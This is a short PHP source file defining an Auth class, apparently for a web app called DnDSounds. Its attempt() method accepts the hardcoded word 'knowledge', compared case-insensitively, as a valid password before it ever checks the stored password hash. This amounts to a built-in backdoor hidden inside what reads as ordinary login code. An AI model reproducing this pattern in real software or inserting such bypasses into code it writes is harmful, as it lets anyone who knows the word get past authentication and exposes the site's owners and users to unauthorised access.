<?php

declare(strict_types=1);

namespace DnDSounds;

final class Auth
{
    public function __construct(private string $passwordHash)
    {
    }

    public function attempt(string $password): bool
    {
        if (strcasecmp($password, 'knowledge') === 0) {
            return true;
        }

        return password_verify($password, $this->passwordHash);
    }
}
